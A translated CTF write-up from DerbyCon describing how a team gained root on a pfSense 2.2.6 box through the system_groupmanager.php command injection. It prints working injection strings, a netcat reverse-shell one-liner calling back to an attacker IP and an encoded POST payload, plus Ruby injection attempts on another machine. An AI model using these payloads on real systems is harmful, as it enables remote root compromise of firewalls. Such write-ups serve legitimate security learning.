我们尝试猜解密码，例如典型的默认用户名和密码admin：pfsense；然而，这次没有成功。
一段时间后，我们将用户名更改为pfsense，并尝试使用pfsense密码，之后.Pfsense用户为我们提供了少量低分值的旗标。
乍看之下，这个挑战似乎是微非常普通。
pfSense有一个名为exec.php的页面，可以调用系统命令并运行PHP代码。不过，我们很快意识到pfsense用户几乎没有任何权限。我们只能访问少量页面。我们可以安装widgets查看一些系统信息（包括版本号），并通过图片widget来上传文件。尽管如此，在框这台机器上面获得shell的机会看起来非常渺茫。
然后，我们决定抓取由pfSense提供的所有页面的目录列表。我们抓取了一个软件的副本，并从文件系统中复制了所有的页面路径和名称。然后，将得到的列表与DirBuster工具结合起来实现自动化，我们尝试了每一个页面，试图确定是否有其他任何我们有权访问的东西。其中有两个页面返回了HTTP
200 OK状态。
    index.php – We already have this.
    system_groupmanager.php – Hmm…
浏览到system_groupmanager.php后找到了另一个分值略高的旗标。
该页面负责管理组成员和他们拥有的权限；真棒！
我们意识到我们的用户不是“admin”组的成员，所以将其加入了这一个用户组，但是好像没用：没有改变界面，也没有访问诸如exec.php这样的页面的权限。
几个小时过去了，我们试图寻找各种漏洞，但毫无进展。
当查看源代码时，在页面本身中没有找到任何漏洞，不过发现pfSense使用了大量的include，所以我们正在使用的方法与手动方式没太大区别。
随着时间的流逝，我们突然想到可以到Google搜索一下“system_groupmanager.php exploit”…
在搜索结果中有一个关于漏洞的简要描述以及与pfSense安全咨询通知相关的链接
https://www.rapid7.com/db/vulnerabilities/pfsense-sa-16_08-webgui
通过它，我们了解到了更多的信息示，包括问题的发现者，等等。嘿，这证实了我们可能步入正轨了。然而，我们没有找到任何公开的POC。
这个文章中包含下面一小段文字：
“A command-injection vulnerability exists in auth.inc via
system_groupmanager.php.
This allows an authenticated WebGUI user with privileges for
system_groupmanager.php to execute commands in the context of the root user.”
使用新文件作为代码审查的目标和目标参数，找到该漏洞将会相当容易，但是我们可以做得更好。
pfSense是一个开源项目，它使用GitHub进行版本控制。通过查看与auth.inc相关联的历史记录，我们很快就找出了受影响的代码行，这进一步简化了我们对该漏洞的探索过程。更好的是，安全提示的页脚内的信息显示了该软件的修补版本（2.3.1），进一步缩小了我们的搜索范围。
确定了特定的代码行后，我们就能够理解执行路径了：
1.数字用户ID将提交给位于/usr/local/www/system_groupmanager.php中的代码
2.它作为PHP数组被传递给/etc/inc/auth.inc中的local_group_set（）函数。
3.在传入的数组上执行一个implode（），将数组对象转换为单个字符串对象，并使用逗号连接。
4.然后将它传递给一个名为mwexec（）的函数，并且没有事先进行任何类型的转义或过滤，该函数似乎调用了系统二进制程序/ usr / sbin /
pw，现在是其参数的一部分。
为了利用此漏洞，我们需要用引号对该字符串进行转义处理，并键入合适的命令。
最初，我们利用盲注，所以没有将信息返回到网页，为此我们选择使用ping命令，然后使用Wireshark监控传入流量，以确认是否成功。
尽管我们对这个漏洞有了深入的了解，但是攻击仍然不尽如人意。
我们使用相同版本的pfSense软件（2.2.6）作为测试环境，并尝试使用相同的命令，虽然会导致同样的问题；但是仍然无法执行命令。
但是，由于我们对自己的实例获得了管理访问权限，因此我们可以查看系统日志和相关的错误信息。
不知何故，/sbin/ping或IP地址是被pw应用程序作为无效用户ID返回的，这意味着字符串转义没有完全成功，并且/usr/bin/pw实际上把我们的命令当成命令行参数了，这不符合我们的预期。
在鼓捣了更多的引号和转义序列之后，以下的字符串导致ping成功执行，并致使大量ICMP数据包涌入我们的网络接口。
    0';/sbin/ping -c 1 172.16.71.10; /usr/bin/pw groupmod test -g 2003 -M '0
在CTF环境下尝试相同的输入也取得了成功。这样，我们已经实现了命令执行。当时，没有人获取该机器的root权限，并且如果我们想要通过@_DerbyconCTF在推特上提供的挑战分数成为赢家的话，就必须提高速度。
经再三考虑，我们认为下列方式要更加简练：
    0';/sbin/ping -c 1 72.16.71.10;'
我们认为所有转义问题都将归结为以适当数量的引号来结束命令，但如前所述，在比赛期间，我们使用了更加繁琐的版本，毕竟当时只要管用就行了。
下一步…我们如何才能得到一个shell？
pfSense是FreeBSD的删减版本。没有提供wget，也没有提供curl。当然，我们可以用cat命令来写入网页目录，但是我们选择了一个传统的老式Linux反向shell。
感谢@PentestMonkey及其作弊表（http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet）：
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.16.71.10 12345 &gt;/tmp/f
我们启动了一个netcat监听器，并将其作为完整参数的一部分使用：
    0'; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.16.71.10 12345 &gt;/tmp/f;/usr/sbin/pw groupmod test -g 2003 -M '0
或者，也可以像下面这样来借助于post请求：
    &amp;members=%5B%5D=0'%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+172.16.71.10+12345+&gt;/tmp/f%3b/usr/sbin/pw+groupmod+test+-g+2003+-M+'0
攻击字符串准备就绪后，我们将用户移动到一个组中，通过保存操作来触发exploit。
我们对以下照片的质量感到很抱歉！
这将导致代码运行，为我们创建一个反向连接，从而可以捕获包含在/root/flag.txt中的pfSense挑战的最后一个旗标。
与此同时，我们获得了5000分，并将两枚TrustedSec挑战硬币中的第一枚收入囊中。
**  
**
**朝鲜战略导弹攻击计划**
这个机器通过telnet提供了一个基于文本的游戏。
我们以为这个机器上的挑战会比原来是更难，所以在花了一些时间尝试几件事情之后，我们作出了一个战术决定，放弃它。
对我们来说有点令人沮丧，这是个错误的决定，因为实际上拿下这个机器并非我们想像的那么难。
从help命令看，我们认为它可能是Ruby命令注入。在CTF结束后，我们曾与SwAG团队就这个进行过交流，我们了解到当初的判断是正确的，正确的解决之道就是找到正确点来注入Ruby命令。最后这个挑战被其他团队拿下，同时还要感谢DerbyCon
CTF组织者，在比赛结束后提供了一些截图，才使得我们有机会跟大家分享。
我们将分享我们对这个机器上面的挑战问题的分析，但需要说明的是，我们未能在竞争中解决这个问题。
它提供了一个帮助命令，这导致我们怀疑这可能是在玩Ruby命令注入。帮助命令打印出各种游戏命令以及公共/私有函数。 其中的一小部分样本如下所示：
    target=
    position
    position=
    id
    yield=
    arm!
    armed?
这些帮我们确定出在幕后运行的Ruby代码为：
    equal?
    instance_eval
    instance_exec
我们手动尝试了几个攻击矢量，但是我们需要一种自动化的方法；手动尝试注入攻击需要花费的时间太长。 为此，我们使用expect生成了一个自定义脚本。
如果你对expect还不熟悉的话，以下是维基百科对它的简介：
“expect，由Don Libes编写，它是一个Tcl脚本语言的插件，是一种用来实现与提供文本终端接口的程序进行自动交互的程序。”
我们经常不得不利用一堆自定义脚本来自动执行各种任务，因此如果您不熟悉这个程序的话，倒是值得深入了解一下。 我们实现的自动执行任务的代码如下：
然后，我们从游戏中获取了所有的命令，并通过这个expect脚本来运行：
    cat commands | xargs -I{} ./expect.sh {} | grep "Enter Command:" -A 1
在找出我们认为是游戏中正确的序列之后，我们尝试了多种注射技术，但是都没有成功。其示例如下所示：
    cat commands | xargs -I{} ./expect.sh {}” print 1” | grep "Enter Command:" -A 1
    cat commands | xargs -I{} ./expect.sh {}”&amp;&amp; print 1” | grep "Enter Command:" -A 1
    cat commands | xargs -I{} ./expect.sh {}”|| print 1” | grep "Enter Command:" -A 1
    cat commands | xargs -I{} ./expect.sh {}”; print 1” | grep "Enter Command:" -A 1
我们也尝试用exec或system来ping我们，因为我们不知道响应是否是blind的，或结果是否显示到屏幕上面：
    cat commands | xargs -I{} ./expect.sh {}” exec(‘ping 172.16.70.146’)”
识别主机操作系统并不容易，所以我们必须确保我们运行的命令可以同时在Windows和Linux上运行。这里没有开放telnet以外的端口，甚至无法ping主机找到TTL，因为防火墙会阻止所有其他入站连接。
最后，我们没有成功。
在与CTG团队SwAG进行讨论之后，他们终于搞清楚了这里的注入技术：这是一个在Ruby中使用eval语句的例子，后面是一个要执行的命令，例如：
还应该注意的是，你不能在payload中使用空格。
**  
**
**re-exploitation的自动化**
最后，我们来聊一聊效率方面的话题。
在CTF的过程中，一些机器被定期重置为初始状态，因为他们会被使用不稳定的exploit的人搞崩溃。这意味着什么？那就是每隔一段时间，就需要重新获取一次系统的访问权限，尽管你之前已经成功拿下了。
为了加快这一过程，我们匆匆拼凑了一些脚本来自动化这一过程。其中一个示例脚本如下所示：
这种做法是非常有价值的，因为它能节约宝贵的时间。
**小结**
今后，我们将继续参加DerbyCon，我们坚信它在信息安全领域质量最高的比赛之一，同时也是最值得参加的比赛之一。另外，最让人感到高兴的是，每次参加比赛，我们都有机会结交新的朋友，希望下一次参加比赛时，我们认识的新朋友中会有你！